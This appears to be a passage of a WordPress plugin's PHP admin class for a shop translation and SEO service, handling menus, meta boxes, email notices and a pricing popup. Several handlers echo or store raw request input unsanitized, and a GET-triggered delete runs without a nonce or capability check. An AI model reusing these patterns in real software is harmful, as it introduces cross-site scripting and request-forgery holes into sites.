<?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

/**
 * Admin Class
 *
 * Manage Admin Panel Class
 *
 * @package wwt Translate
 * @since 1.0.0
 */

class Wwt_Tran_Admin {

	public $model, $scripts;

	//class constructor
	function __construct() {

		global $wwt_tran_model, $wwt_tran_scripts;

		$this->scripts = $wwt_tran_scripts;
		$this->model   = $wwt_tran_model;
	}
  
	/**
	 * Create menu page
	 *
	 * Adding required menu pages and submenu pages
	 * to manage the plugin functionality
	 * 
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	 public function wwt_tran_add_menu_page() {

		$wwt_tran_setting_page = add_menu_page( __( 'Shop Translate', WWT_TRAN_TEXT_DOMAIN ), __( 'Shop Translate', WWT_TRAN_TEXT_DOMAIN ), 'manage_options', 'wwt-translate', array( $this, 'wwt_tran_settings_page' ), WWT_TRAN_URL.'includes/images/ShopTranslate-Icon.png' );
		$wwt_tran_sub_page     = add_submenu_page( 'wwt-translate', __( 'Adjust Price', WWT_TRAN_TEXT_DOMAIN ), __( 'Adjust Price', WWT_TRAN_TEXT_DOMAIN ), 'manage_options', 'wwt-tran-adjust-price', array( $this, 'wwt_tran_adjust_price_settings_page' ) );
		$wwt_tran_sub_page     = add_submenu_page( 'wwt-translate', __( 'Shop Request List', WWT_TRAN_TEXT_DOMAIN ), __( 'Shop Request List', WWT_TRAN_TEXT_DOMAIN ), 'manage_options', 'wwt-tran-request-list', array( $this, 'wwt_tran_shop_translate_request_list_page' ) );
		add_submenu_page( '', __( 'Shop Request List', WWT_TRAN_TEXT_DOMAIN ), __( 'Shop Request List', WWT_TRAN_TEXT_DOMAIN ), 'manage_options', 'wwt-tran-shop-request-view', array( $this, 'wwt_tran_shop_translate_request_view_page' ) );		

		add_action( "admin_head-$wwt_tran_setting_page", array( $this->scripts, 'wwt_tran_page_load_scripts' ) );

	 }

	/**
	 * Including File for WWT Translate Menu
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_settings_page() {

		include_once( WWT_TRAN_ADMIN_DIR . '/forms/stsmw-plugin-settings.php' );
	}

	public function wwt_tran_shop_translate_request_list_page(){
		include_once( WWT_TRAN_ADMIN_DIR . '/forms/stsmw-translate-request-log.php' );
	}

	public function wwt_tran_shop_translate_request_view_page(){
		include_once( WWT_TRAN_ADMIN_DIR . '/forms/stsmw-translate-request-view.php' );
	}


	/**
	 * Including File for Adjust Price Menu
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_adjust_price_settings_page() {

		include_once( WWT_TRAN_ADMIN_DIR . '/forms/stsmw-adjust-price-settings.php' );
	}

	/**
	 * Register Settings
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_register_settings() {

		register_setting( 'wwt_tran_plugin_options', 'wwt_tran_options', array( $this, 'wwt_tran_validate_options' ) );
	}

	/**
	 * Validate Settings
	 *
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_validate_options( $input ) {

		global $wwt_tran_options;

		//Check icon settings exist
		if( !empty( $input['shop_list'] ) ){

			//Array indexing
			$input['shop_list'] = array_values( $input['shop_list'] );

			$i = 0;
			//Check Blank settins exist then remove it
			foreach ( $input['shop_list'] as $shop ){
					if( empty( $shop ) ){
						//Remove blank settings
						unset($input['shop_list'][$i]);
					}
			$i++;
			}
		}

		//filter to save all settings to database
		return apply_filters( 'wwt_tran_save_settings', $input, $wwt_tran_options );
	}

	/**
	 * Translate Button check on Taxonomy
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_categories_tags_actions(){

		global $wwt_tran_options;

		//Get both terms list
		$professional_terms 	= !empty( $wwt_tran_options['professional']['terms'] )? $wwt_tran_options['professional']['terms'] : array();
		$seo_professional_terms = !empty( $wwt_tran_options['seo_professional']['terms'] )? $wwt_tran_options['seo_professional']['terms'] : array();

		//Merge both terms and remove repeat terms
		$terms_list =  array_unique( array_merge( $professional_terms, $seo_professional_terms ) );

		foreach ( $terms_list as $term ) {

			//added action exist terms
		 	add_action( $term .'_edit_form', array( $this, 'wwt_tran_display_buttons_taxonomy' ), 10, 2 ) ;
		}
	}

	/**
	 * Display Translate Buttons on category, tags page
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_display_buttons_taxonomy( $taxonomy_data, $taxonomy ) {

		global $wwt_tran_options;
		?>
		<table class="form-table">
			<tbody>
				<tr class="form-field term-buttons-wrap">
					<th scope="row">
						<label><?php _e( 'Shop Translate' );?></label>
					</th>
					<td>
						<div>
							<p><img src="<?php echo WWT_TRAN_URL.'includes/images/ShopTranslateLogo.jpg' ?>" class="wwt-tran-logo-terms" alt="<?php _e( 'Shop Translate', WWT_TRAN_TEXT_DOMAIN ); ?>"></p>
							<?php
							if( !empty( $wwt_tran_options['professional']['terms'] ) && in_array( $taxonomy, $wwt_tran_options['professional']['terms'] ) ) {

								echo '<a class="wwt-tran-ajax-btn wwt-tran-btn" href="javascript:void(0)" data-popup="term" data-id="'.(!empty( $taxonomy_data->term_id )? $taxonomy_data->term_id : '').'">'.__( 'Translate', WWT_TRAN_TEXT_DOMAIN ).'</a>';
								//echo '<span class="spinner wwt-tran-spinner"></span>';
							}

							//SEO Professional Button Display
							if( !empty( $wwt_tran_options['seo_professional']['terms'] ) && in_array( $taxonomy, $wwt_tran_options['seo_professional']['terms'] ) ) {
								echo '<a class="wwt-tran-seo-pro-term-btn wwt-tran-btn" href="javascript:void(0)">'.__( 'SEO Suggestions', WWT_TRAN_TEXT_DOMAIN ).'</a>';
							}
						?>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	<?php
		include_once( WWT_TRAN_ADMIN_DIR.'/forms/stsmw-terms-shop-translate-popup.php' );
	}

	/**
	 * Translate Terms Button process
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_translate_buttons_terms_process() {

		global $wwt_tran_options, $current_user;

		$response   = array();

		//Define blank variable
		$email = $message = $from_name = $from_email = $subject = $seo_texts = $google_tran = $per_word_price = $total_words = $total_price = $spend_time ="";

		//Get ajax passed post data
		$term_id 	= isset( $_POST['term_id'] ) ? $_POST['term_id'] : 'N/A';
		$btn_type 	= isset( $_POST['btn_type'] ) ? $_POST['btn_type'] : 'N/A';

		if( !empty( $_POST['term_id'] ) && !empty( $btn_type ) ) {

			$term 		= get_term($term_id);
			$arg 		= array( 
							'taxonomy' => !empty( $term->taxonomy ) ? $term->taxonomy :'',
							'tag_ID'   => $term_id,
				   		  );

			$page_url   = add_query_arg( $arg , admin_url( 'term.php', ( is_ssl() ? 'https' : 'http' ) ) );

			$title      =  !empty( $term->name ) ? $term->name : 'N/A';
			$type       =  !empty( $term->taxonomy ) ? $term->taxonomy : 'N/A';
			$page_url   =  !empty( $page_url ) ? $page_url : 'N/A';
			$user  		=  !empty( $current_user->display_name ) ? $current_user->display_name : 'Guest';

			if ( $btn_type == 'seo' )	{

				$total_price	= !empty( $_POST['total_price'] ) ? '&#8364;'.$_POST['total_price'] : 'N/A';
				$spend_time		= !empty( $_POST['spend_time'] ) ? $_POST['spend_time'].' Minutes Costs : '.$total_price : 'N/A';
				$seo_texts		= !empty( $_POST['seo_texts'] ) ? $_POST['seo_texts'] : 'N/A';
				$seo_advise		= !empty( $_POST['seo_advise'] ) ? $_POST['seo_advise'] : '';

				if( $seo_advise == 'Particular Question' ) {
					$seo_advise = 'Particular Question <br/> Text :'. $seo_texts;
				} 

				$email      = !empty( $wwt_tran_options['seo_professional']['admin_recipient'] ) ? $wwt_tran_options['seo_professional']['admin_recipient'] : '';
				$message    = !empty( $wwt_tran_options['seo_professional']['term_admin_email_body'] ) ? $wwt_tran_options['seo_professional']['term_admin_email_body'] : '';
				$from_name  = !empty( $wwt_tran_options['seo_professional']['from_name'] ) ? $wwt_tran_options['seo_professional']['from_name'] : '';
				$from_email = !empty( $wwt_tran_options['seo_professional']['from_email'] ) ? $wwt_tran_options['seo_professional']['from_email'] : '';
				$subject 	=  __('SEO Professional Translate', WWT_TRAN_TEXT_DOMAIN );
			}

			//Admin email start
			$to   =  explode( ',', $email );
			//$to[] = 'info@shoptranslate.com';

			$fromemail 	=  $from_name . ' <' . $from_email . '>';
			$no_reply 	=  'noreply <'.$from_email.'>';

			$headers[]  =  'From: '. $fromemail . "\r\n";
			$headers[]  =  'Reply-To: '. $no_reply . "\r\n";
			$headers[]  =  "MIME-Version: 1.0\r\n";
			$headers[]  =  "Content-Type: text/html; charset=utf-8\r\n";

			// Prepare message
			$message = str_replace( '{id}', $term_id, $message );
			$message = str_replace( '{title}', $title, $message );
			$message = str_replace( '{type}', $type, $message );
			$message = str_replace( '{page_url}', $page_url, $message );
			$message = str_replace( '{user}', $user, $message );
			$message = str_replace( '{total_price}', $total_price, $message );
			$message = str_replace( '{total_words}', $total_words, $message );
			$message = str_replace( '{price_per_word}', $per_word_price, $message );
			$message = str_replace( '{seo_advise}', $seo_advise, $message );
			$message = str_replace( '{spend_time}', $spend_time, $message );
			$message = str_replace( '{google_translate}', $google_tran, $message );

			$message = nl2br($message);

			wp_mail( $to, $subject, $message, $headers );

			$response['sucess'] = 1;
			$response['msg']    = __( 'Your inquiry submitted successfully.', WWT_TRAN_TEXT_DOMAIN );

			$arg_body_parameter = array(
										'yws_path'		=>  1,
										'address'		=> HOSTNAME,
										'createproduct'	=> $title,
										'productprice'	=> !empty($_POST['total_price'])? $_POST['total_price'] : 0,
										'product_id'	=> $term_id,
										'shop_name'		=> '',
										'description'	=> $content,
										'site_url'		=> get_site_url(),
										'remark'	    => $seo_advise.' <br/><b>Spend Time:</b> '.$spend_time,
										'is_shrt_desc_check'=> '',
										'full_or_part_text' => '',
										'full_or_part_val'  => '',
										'type'   			=> 'Category',
									  );

			$response = $this->model->wwt_tran_seo_payment_add_to_cart_setup( $arg_body_parameter );

		} else {
			$response['error'] = 1;
			$response['msg']    = __( 'Please try again.', WWT_TRAN_TEXT_DOMAIN );
		}

		echo json_encode($response);
		exit;
	}

	/**
	 * Add ShopTranslate Metabox
	 *
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_add_meta_box(){
		add_meta_box( 'wwt_tran_shop_translate_meta', __( 'Shop Translate', WWT_TRAN_TEXT_DOMAIN ), array( $this, 'wwt_tran_display_shop_translate_section' ), array( 'page', 'post', 'product' ), 'side', 'high' );
		add_meta_box( 'wwt_tran_shop_translate_meta_fields', __( 'Shop Translate Fields', WWT_TRAN_TEXT_DOMAIN ), array( $this, 'wwt_tran_display_shop_translate_fields_section' ), array( 'page', 'post', 'product' ), 'normal', 'default' );
	}

	/**
	 * Display Translate Button
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_display_shop_translate_section() {

		global $post, $wwt_tran_options; 
		?>
		<p><img src="<?php echo WWT_TRAN_URL.'includes/images/ShopTranslateLogo.jpg' ?>" class="wwt-tran-logo-sidebar" alt="<?php _e( 'Shop Translate', WWT_TRAN_TEXT_DOMAIN ); ?>"></p>

		<?php	
		//Professional Translate button Display
		if ( $this->model->wwt_tran_pro_enable() ) {

			//Ajax button
			echo '<a class="wwt-tran-ajax-btn wwt-tran-btn" href="javascript:void(0)" data-popup="post" data-id="'.(!empty( $post->ID )? $post->ID : '').'">'.__( 'Translate', WWT_TRAN_TEXT_DOMAIN ).'</a>';
			//echo '<span class="spinner wwt-tran-spinner"></span>';
		}

		//SEO Professional Button Display
		if ( $this->model->wwt_tran_seo_pro_enable() ) {

			echo '<a class="wwt-tran-seo-pro-btn wwt-tran-btn" href="javascript:void(0)" data-btn_type="seo" data-id="'.(!empty( $post->ID )? $post->ID : '').'">'.__( 'SEO Suggestions', WWT_TRAN_TEXT_DOMAIN ).'</a>';
		}

		$shop_translate_data = get_post_meta( $post->ID, WWT_TRAN_PREFIX.'shop_translate_data', true );

		if( !empty( $shop_translate_data['Foreign Shop']['google_translate'] ) ) {
			echo '<p><label><strong>'.__( 'Google Translate', WWT_TRAN_TEXT_DOMAIN ).' : </strong> '.$shop_translate_data['Foreign Shop']['google_translate'].'</label></p>';
		}

		if( !empty( $shop_translate_data['Foreign Shop']['product_disable'] ) ) {
			echo '<p><label><strong>'.__( 'Disable Product', WWT_TRAN_TEXT_DOMAIN ).' : </strong> '.$shop_translate_data['Foreign Shop']['product_disable'].'</label></p>';
		}
		?>
		<p class="wwt-chat-section">
			<a class="wwt-tooltip wwt-chat-link" href="javascript:$zopim.livechat.window.show();" data-tooltip="<?php _e( 'Do you like to get more information or support? No problem, we are here for you!', WWT_TRAN_TEXT_DOMAIN ); ?>" ><i class="dashicons dashicons-format-chat"></i> <?php _e( 'Chat', WWT_TRAN_TEXT_DOMAIN ); ?></a>
		</p>
		<?php
	}

	/**
	 * Display Translate Button
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_display_shop_translate_fields_section() {

		global $post;

		$shop_translate_data = get_post_meta( $post->ID, WWT_TRAN_PREFIX.'shop_translate_data', true );

		if( !empty( $shop_translate_data ) ) {

			foreach ( $shop_translate_data as $key => $value ) {
				echo '<p>
						<label for="wwt-tran-google-tran">
							<strong>'.__( 'Shop Name', WWT_TRAN_TEXT_DOMAIN ).' :</strong> '.( !empty( $value['shop_name'] ) ? $value['shop_name'] : 'N/A' ).'</label>
					  </p>';
				echo '<div class="shop_section_display">';
					echo '<p>
							<label for="wwt-tran-google-tran"> - 
								<strong>'.__( 'Google translate', WWT_TRAN_TEXT_DOMAIN ).' :</strong> '.( !empty( $value['google_translate'] ) ? $value['google_translate'] : 'No' ).'</label>
						 </p>';
					echo '<p>
							<label for="wwt-tran-google-tran"> - 
								<strong>'.__( 'Translate Text', WWT_TRAN_TEXT_DOMAIN ).' :</strong> '.( !empty( $value['google_translate_desc'] ) ? $value['google_translate_desc'] : 'N/A' ).'</label>
						 </p>';
					echo '<p>
							<label for="wwt-tran-google-tran"> - 
								<strong>'.__( 'Product Disable', WWT_TRAN_TEXT_DOMAIN ).' :</strong> '.( !empty( $value['product_disable'] ) ? $value['product_disable'] : 'No' ).'</label>
						 </p>';
					echo '<p>
							<label for="wwt-tran-google-tran"> - 
								<strong>'.__( 'Partial Text', WWT_TRAN_TEXT_DOMAIN ).' :</strong> '.( !empty( $value['partial_text'] ) ? $value['partial_text'] : 'N/A' ).'</label>
						 </p>';
					echo '<p>
							<label for="wwt-tran-google-tran"> - 
								<strong>'.__( 'Own Description', WWT_TRAN_TEXT_DOMAIN ).' :</strong> '.( !empty( $value['own_full_description'] ) ? $value['own_full_description'] : 'N/A' ).'</label>
						 </p>';
					echo '<p>
							<label for="wwt-tran-google-tran"> - 
								<strong>'.__( 'Own Short Description', WWT_TRAN_TEXT_DOMAIN ).' :</strong> '.( !empty( $value['own_short_description'] ) ? $value['own_short_description'] : 'N/A' ).'</label>
						 </p>';
				echo '</div>';
			}
		}
	}

	/**
	 * Add popup form for Shop Translate
	 * 
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	 function wwt_tran_shop_translate_popup_markup() {
		include_once( WWT_TRAN_ADMIN_DIR.'/forms/stsmw-shop-translate-popup.php' );
	 }

	/**
	 * Translate Button process
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_translate_buttons_admin_process() {

		global $wwt_tran_options, $current_user;

		$response  = array();

		//Define blank variable
		$email = $message = $from_name = $from_email = $subject = $google_tran = $seo_advise = $per_word_price = $total_words = $total_price = $spend_time ="";

		//Get ajax passed post data
		$post_id 	    = !empty( $_POST['post_id'] ) ? $_POST['post_id'] : 'N/A';
		$btn_type 		= isset( $_POST['btn_type'] ) ? $_POST['btn_type'] : 'N/A';

		if( !empty( $_POST['post_id'] ) && !empty( $btn_type ) ) {

			$post 	= get_post( $post_id );

			$title      =  !empty( $post->post_title ) ? $post->post_title : 'N/A';
			$type       =  !empty( $post->post_type )? $post->post_type : 'N/A';
			$content    =  !empty( $post->post_content )? $post->post_content : 'N/A';
			$page_url   =  get_permalink( $post_id );
			$page_url   =  !empty( $page_url ) ? $page_url : 'N/A';

			$user  		=  !empty( $current_user->display_name ) ? $current_user->display_name : 'Guest';

			if ( $btn_type == 'seo' )	{

				$total_price	= !empty( $_POST['total_price'] ) ? '&#8364;'.$_POST['total_price'] : 'N/A';
				$spend_time		= !empty( $_POST['spend_time'] ) ? $_POST['spend_time'].' Minutes': 'N/A';
				$seo_texts		= !empty( $_POST['seo_texts'] ) ? $_POST['seo_texts'] : 'N/A';
				$seo_advise		= !empty( $_POST['seo_advise'] ) ? $_POST['seo_advise'] : '';

				if( $seo_advise == 'Particular Question' ) {
					$seo_advise = 'Particular Question <br/> Question :'. $seo_texts;
				}

				

				$email      = !empty( $wwt_tran_options['seo_professional']['admin_recipient'] ) ? $wwt_tran_options['seo_professional']['admin_recipient'] : '';
				$message    = !empty( $wwt_tran_options['seo_professional']['admin_email_body'] ) ? $wwt_tran_options['seo_professional']['admin_email_body'] : '';
				$from_name  = !empty( $wwt_tran_options['seo_professional']['from_name'] ) ? $wwt_tran_options['seo_professional']['from_name'] : '';
				$from_email = !empty( $wwt_tran_options['seo_professional']['from_email'] ) ? $wwt_tran_options['seo_professional']['from_email'] : '';
				$subject 	=  __('SEO Professional Translate', WWT_TRAN_TEXT_DOMAIN );

			}

			//Admin email start
			$to   =  explode( ',', $email );
			//$to[] = 'info@shoptranslate.com';
			$fromemail 	=  $from_name . ' <' . $from_email . '>';
			$no_reply 	=  'noreply <'.$from_email.'>';

			$headers[]  =  'From: '. $fromemail . "\r\n";
			$headers[]  =  'Reply-To: '. $no_reply . "\r\n";
			$headers[]  =  "MIME-Version: 1.0\r\n";
			$headers[]  =  "Content-Type: text/html; charset=utf-8\r\n";

			// Prepare message
			$message = str_replace( '{id}', $post_id, $message );
			$message = str_replace( '{title}', $title, $message );
			$message = str_replace( '{content}', $content, $message );
			$message = str_replace( '{type}', $type, $message );
			$message = str_replace( '{page_url}', $page_url, $message );
			$message = str_replace( '{user}', $user, $message );
			$message = str_replace( '{total_price}', $total_price, $message );
			$message = str_replace( '{total_words}', $total_words, $message );
			$message = str_replace( '{price_per_word}', $per_word_price, $message );
			$message = str_replace( '{seo_advise}', $seo_advise, $message );
			$message = str_replace( '{spend_time}', $spend_time, $message );
			$message = str_replace( '{google_translate}', $google_tran, $message );

			$message = nl2br($message);

			wp_mail( $to, $subject, $message, $headers );

			$arg_body_parameter = array(
										'yws_path'		=>  1,
										'address'		=> HOSTNAME,
										'createproduct'	=> $title,
										'productprice'	=> !empty($_POST['total_price'])? $_POST['total_price'] : 0,
										'product_id'	=> $post_id,
										'shop_name'		=> '',
										'description'	=> $content,
										'site_url'		=> get_site_url(),
										'remark'	    => $seo_advise.' <br/><b>Spend Time:</b> '.$spend_time,
										'is_shrt_desc_check'=> '',
										'full_or_part_text' => '',
										'full_or_part_val'  => '',
										'type'   			=> $type,
									  );

			$response = $this->model->wwt_tran_seo_payment_add_to_cart_setup( $arg_body_parameter );

			//$response['msg']    = __( 'Your inquiry submitted successfully.', WWT_TRAN_TEXT_DOMAIN );

		} else {
			$response['error']  = 1;
			$response['msg']    = __( 'Please try again.', WWT_TRAN_TEXT_DOMAIN );
		}

		echo json_encode($response);
		exit;
	}

	/**
	 * Translate Adjust Price Save send
	 *
	 * @package Wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_adjust_price_save() {
		
		if( !empty( $_POST['wwt-tran-product-send-details'] ) ) {

			global $wwt_tran_options, $current_user;
			$title = $id = $url = "N/A" ;

			$price_option    = !empty( $_POST['wwt-tran-price-options'] ) ? $_POST['wwt-tran-price-options'] : '' ;
			$product_id      = !empty( $_POST['wwt-tran-price-product'] ) ? $_POST['wwt-tran-price-product'] : '' ;
			$product_cat     = !empty( $_POST['wwt-tran-product-cat'] ) ? $_POST['wwt-tran-product-cat'] : '' ;
			//$product_price   = !empty( $_POST['wwt-tran-product-price'] ) ? $_POST['wwt-tran-product-price'] : '' ;
			$percent_price   = !empty( $_POST['wwt-tran-product-price-in-percent'] ) ? $_POST['wwt-tran-product-price-in-percent'].'%' : 'N/A' ;
			$flat_price      = !empty( $_POST['wwt-tran-product-price-in-flat'] ) ? $_POST['wwt-tran-product-price-in-flat'] : 'N/A' ;
			$price_format    = !empty( $_POST['wwt-tran-product-price-format'] ) ? $_POST['wwt-tran-product-price-format'] : '' ;


			if( !empty( $price_option ) && $price_option == 'product' ) {

				$data = get_post( $product_id );
				
				$id 	= !empty( $product_id )? $product_id : 'N/A';
				$title  = !empty( $data->post_title ) ? $data->post_title : 'N/A';
				$url    = get_permalink($product_id);
				$url    = !empty( $url ) ? $url : 'N/A';
			}

			if( !empty( $price_option ) && $price_option == 'category' ) {

				$term   = get_term( $product_cat );
				$arg 	= array( 
							'taxonomy' => !empty( $term->taxonomy ) ? $term->taxonomy :'',
							'tag_ID'   => $product_cat,
				   		   );
				$page_url   = add_query_arg( $arg , admin_url( 'term.php', ( is_ssl() ? 'https' : 'http' ) ) );

				$id	   = $product_cat;
				$title = ( !empty( $term->name ) ? $term->name : 'N/A' );				
				$url  = !empty( $page_url ) ? $page_url : 'N/A';
			}

			$user  		=  !empty( $current_user->display_name ) ? $current_user->display_name : 'Guest';

			$response   = array();

			//Define blank variable
			$email      = !empty( $wwt_tran_options['product']['admin_recipient'] ) ? $wwt_tran_options['product']['admin_recipient'] : '';
			$message    = !empty( $wwt_tran_options['product']['admin_email_body'] ) ? $wwt_tran_options['product']['admin_email_body'] : '';
			$from_name  = !empty( $wwt_tran_options['product']['from_name'] ) ? $wwt_tran_options['product']['from_name'] : '';
			$from_email = !empty( $wwt_tran_options['product']['from_email'] ) ? $wwt_tran_options['product']['from_email'] : '';
			$subject 	=  __('Adjust Price Translate', WWT_TRAN_TEXT_DOMAIN );

			//Admin email start
			$to   =  explode( ',', $email );
			//$to[] = 'info@shoptranslate.com';
			$fromemail 	=  $from_name . ' <' . $from_email . '>';
			$no_reply 	=  'noreply <'.$from_email.'>';

			$headers[]  =  'From: '. $fromemail . "\r\n";
			$headers[]  =  'Reply-To: '. $no_reply . "\r\n";
			$headers[]  =  "MIME-Version: 1.0\r\n";
			$headers[]  =  "Content-Type: text/html; charset=utf-8\r\n";

			// Prepare message
			$message = str_replace( '{price_rule}', ucfirst($price_option), $message );
			$message = str_replace( '{price}', $percent_price, $message );
			$message = str_replace( '{extra_cost}', $flat_price, $message );
			$message = str_replace( '{id}', $id, $message );
			$message = str_replace( '{title}', $title, $message );
			$message = str_replace( '{url}', $url, $message );
			$message = str_replace( '{user}', $user, $message );

			$message = nl2br($message);

			wp_mail( $to, $subject, $message, $headers );

			//Get current user id
			$user_id 		= get_current_user_id();
			
			$args = array(
							'posts_per_page' => -1,
							'fields'		 => 'ids',
							'meta_query' 	 => array(
													'relation' => 'AND',
													array(
														'key'     => WWT_TRAN_PREFIX.'id',
														'value'   => $id,
														'compare' => '=',
													),
													array(
														'key'     => WWT_TRAN_PREFIX.'pricing_option',
														'value'   => $price_option,
														'compare' => '=',
													),
												)
					);

			$posts_id = $this->model->wwt_tran_product_log_data( $args );

			if( !empty( $posts_id['data'] ) ) {
				$log_id = !empty( $posts_id['data'][0] ) ? $posts_id['data'][0] : '';
			} else{
				$log_args = array(
										'post_type' 	=> WWT_TRAN_LOG_POST_TYPE,
										'post_status' 	=> 'publish',
										'post_title' 	=> $title.'-log' ,
										'post_author' 	=> $user_id,
										'menu_order' 	=> 0,
										'comment_status'=> 'closed'
									);
 			
				//Create Log post
				$log_id 	= wp_insert_post( $log_args );
			}

			if( !empty( $log_id ) ) {
				update_post_meta( $log_id, WWT_TRAN_PREFIX.'title', $title );
				update_post_meta( $log_id, WWT_TRAN_PREFIX.'pricing_option', $price_option );
				update_post_meta( $log_id, WWT_TRAN_PREFIX.'price_percent', $percent_price );
				update_post_meta( $log_id, WWT_TRAN_PREFIX.'price_flat', $flat_price );
				update_post_meta( $log_id, WWT_TRAN_PREFIX.'id', $id );
				update_post_meta( $log_id, WWT_TRAN_PREFIX.'url', $url );
			}

			$arg = array(
						'page' => 'wwt-tran-adjust-price',
						'settings-updated' => true,
					);
			$page_url   = add_query_arg( $arg , admin_url( 'admin.php', ( is_ssl() ? 'https' : 'http' ) ) );
			wp_redirect($page_url);
			exit;
		}

		//Product Single Delete Process
		if( ( isset( $_GET['action'] ) && $_GET['action'] == 'delete' ) && isset($_GET['page']) && $_GET['page'] == 'wwt-tran-adjust-price' ) { //check action and page
		
			// Get redirect url
			$redirect_url = add_query_arg( array( 'page' => 'wwt-tran-adjust-price' ), admin_url( 'admin.php' ) );

			//get bulk product array from $_GET
			if( !empty($_GET['product']) ) { //check there is some checkboxes are checked or not 

				wp_delete_post( $_GET['product'] );
				$redirect_url = add_query_arg( array( 'message' => '3' ), $redirect_url );

				//if bulk delete is performed successfully then redirect 
				wp_redirect( $redirect_url ); 
				exit;
			} else {
				//if there is no checboxes are checked then redirect to listing page
				wp_redirect( $redirect_url ); 
				exit;
			}
		}
	}

	/**
	 * Build Popup for Translate
	 * Professional Translate
	 * 
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	function wwt_tran_build_translate_popup_process() {

		global  $wwt_tran_options;

		//Shop List
		$shop_list	= !empty( $wwt_tran_options['shop_list'] ) ? $wwt_tran_options['shop_list'] : array( 0 => array( 'name' => 'Foreign Shop', 'url' => '', 'lang' => 'en' ));
		$shop_lang	= !empty($wwt_tran_options['shop_list'][0]['lang']) ? $wwt_tran_options['shop_list'][0]['lang'] : '';

		$response = array();

		//Check popup type and id
		$popup_type = !empty( $_POST['popup_type'] ) ? $_POST['popup_type'] : '';
		$popup_id   = !empty( $_POST['popup_id'] ) ? $_POST['popup_id'] : '';

		
		$price_of_word  = !empty( $wwt_tran_options['general']['special_id'] )?  (int)substr( $wwt_tran_options['general']['special_id'],0, 2 ) : 0;
		$price_of_word  = is_numeric($price_of_word) ? $price_of_word / 100 : 0;

		$api_valid  = !empty( $wwt_tran_options['general']['api_valid'] )?  $wwt_tran_options['general']['api_valid'] : '';
		//Popup for Post, product
		if( $popup_type == 'post' ) {

			$post 			= get_post( $popup_id );
			$id				= !empty( $post )? $post->ID : '';
			$content 		= !empty( $post->post_content )? $post->post_content : '';
			$title			= !empty( $post->post_title )? $post->post_title : '';
			$excerpt	    = get_post_field( 'post_excerpt', $id );
			$excerpt_word 	= !empty( $excerpt ) ? str_word_count( strip_tags( $excerpt ), 0, '_' ) : 0;
			$content_word 	= !empty( $content ) ? str_word_count( strip_tags( $content ), 0, '_' ) : 0;			
			$title_word 	= !empty( $title ) ? str_word_count( strip_tags( $title ), 0, '_' ) : 0;
			$total_word 	= $content_word + $title_word + $excerpt_word;
		}

		//Popup for category
		if( $popup_type == 'term' ) {

			$term = get_term( $popup_id );

			$id			   = !empty( $term->term_id )? $term->term_id : '';
			$content	   = !empty( $term->description )? $term->description : '';
			$title		   = !empty( $term->name )? $term->name : '';

			$content_word  = !empty( $content ) ? str_word_count( strip_tags( $content ), 0, '_' ) : 0;
			$title_word    = !empty( $title ) ? str_word_count( strip_tags( $title ), 0, '_' ) : 0;
			$total_word    = $content_word + $title_word;

		}

		ob_start();
		?>

			<!-- Professional Translate Popup -->
			<div class="wwt-tran-modal-content">
				<div class="wwt-tran-modal-header">
					<span class="wwt-tran-modal-close">&times;</span>
					<h3><?php _e( 'Professional Translate', WWT_TRAN_TEXT_DOMAIN ); ?></h3>
				</div>
				<div class="wwt-tran-modal-body">
				<form id="wwt-tran-pro-form" action="" method="POST">

					<p class="wwt-modal-logo">
						<img src="<?php echo WWT_TRAN_URL.'includes/images/ShopTranslateLogo.jpg' ?>" class="wwt-tran-logo-sidebar" alt="<?php _e( 'Shop Translate', WWT_TRAN_TEXT_DOMAIN ); ?>">
					</p>
					<p>	
						<div class="wwt-tran-msg"></div>
					</p>
					<p class="wwt-shop-list">
						<label for="wwt-tran-shop-list"><?php _e( 'Select Shop :', WWT_TRAN_TEXT_DOMAIN ) ?></label>
						<select id="wwt-tran-shop-list" name="professional-form[shop_name]">
						<?php
							foreach ( $shop_list as $key => $value ) {
								echo '<option data-lang="'.$value['lang'].'" value="'.$key.'">'.$value['name'].'</option>';
							}
						?>
						</select>
					</p>

					<p>
						<input type="radio" name="professional-form[translate_type]" class="wwt-translate-type" value="default" checked id="wwt-tran-default-tran-popup">
						<label for="wwt-tran-default-tran-popup"><?php _e( 'Professional Translate', WWT_TRAN_TEXT_DOMAIN ) ?></label>

						<input type="radio" name="professional-form[translate_type]" class="wwt-translate-type" value="google" id="wwt-tran-google-tran-popup">
						<?php
							$google_tran_label = ( $popup_type == 'term' ? __( ' Google Translate / Own Translation', WWT_TRAN_TEXT_DOMAIN )  : __( 'Google Translate', WWT_TRAN_TEXT_DOMAIN ));
						?>
						<label for="wwt-tran-google-tran-popup"><?php echo $google_tran_label; ?></label>
						<?php
						if( $popup_type == 'post' ) { ?>
						<input type="radio" name="professional-form[translate_type]" class="wwt-translate-type" value="own" id="wwt-tran-own-tran-popup">
						<label for="wwt-tran-own-tran-popup"><?php _e( 'Own Translation', WWT_TRAN_TEXT_DOMAIN ) ?></label>
						<?php } ?>
						<p>
						<input type="radio" name="professional-form[translate_type]" class="wwt-translate-type" value="disable_product" id="wwt-tran-disable-product-popup">
						<label for="wwt-tran-disable-product-popup"><?php _e( 'Disable Product', WWT_TRAN_TEXT_DOMAIN ) ?></label>
					</p>
					</p>
					<p class="wwt-cost-wrap">
						<span class="wwt-modal-span"><?php _e( 'Cost :', WWT_TRAN_TEXT_DOMAIN )?> </span>
						<?php 
						$total_price = round($price_of_word*$total_word,2);
